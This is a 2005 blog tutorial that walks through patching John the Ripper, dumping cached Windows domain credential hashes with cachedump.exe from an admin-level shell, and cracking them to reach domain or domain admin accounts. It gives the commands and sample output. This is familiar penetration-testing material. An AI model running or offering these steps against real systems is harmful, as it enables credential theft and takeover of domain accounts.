---
id: 8
title: Grabbing And Cracking Cached Domain Hashs(mscash) w/ John
date: 2005-10-28T19:15:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=8
permalink: /?p=8
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2005/10/grabbing-and-cracking-cached-domain_28.html
categories:
  - Uncategorized
tags:
  - Cracking
---
This is something I wrote up a while back. Not that great but wanted to document it before I lost it.

&#8212;

Background: Its great gaining local admin on a windows box,but then you are limited to that box.
  
Its much more useful getting a Domain user or even Domain Enterprise Admin!
  
Assumming you are on a Domain.
  
Most Windows Domains have password caching turned on.
  
Which means anytime a domain user logs into the box it is cached in the registry with SYSTEM rights.
  
Now lets see how we can grab this and crack it.

Note: I only did this in Linux, I have no idea if it work in windows.
  
Also, I will not go into much technical details on the caching. Google if you want to learn more.
  
The info is out there.

Tools: 1. John The Ripper(1.6.37) &#8211; <http://www.openwall.com/john/> (you will need the src, we will patch it)
  
2. mscashdump &#8211; <http://www.off-by-one.net/misc/cachedump.html>
  
3. John The Ripper Patch &#8211; <http://www.banquise.net/misc/patch-john.html> (get &#8220;the big patch&#8221;)

Steps: 1. Compile and Patch John(john dir and patch must be in same dir)
  
-tar xfz john-1.6.37.tar.gz
  
-gunzip -c john-1.6.37-bigpatch-13.diff.gz | patch -p0 (should see it patching files)
  
-cd john-1.6.37/src/
  
-make

Note: Now you have john patched,it can accept much more hashes such as mscash. Another favorite
  
of mine is Lotus Notes, its pretty easy to get anyone’s Notes hash without even being a user.
  
I&#8217;ll save that for a different doc, we&#8217;ll stick with mscash.

2. Get cached passwords from windows box (must be local admin)
  
-cmd.exe
  
-cachedump.exe -v (should first install a service to get SYSTEM rights)
  
-Output should look like the following.

CacheDump service successfully installed.
  
Service started.
  
user1:5E9092870891234FEF30940952359045633456:domain:
  
domainadmin:D938458093490BF9035649095CC334:domain:
  
user2:8982390FAB93099EF30940945745:domain:
  
Service successfully removed.

-copy and paste the hashs to a txt file for john.

3. Now we get to crack it. Your choice on brute or dict.
  
-./john -format:mscash ./mshashs.txt

Note: Now you just have to wait. Depending on how good the password is.
  
And that’s It. Have Fun

References:
  
<http://www.off-by-one.net/misc/cachedump.html>
  
<http://www.banquise.net/misc/patch-john.html>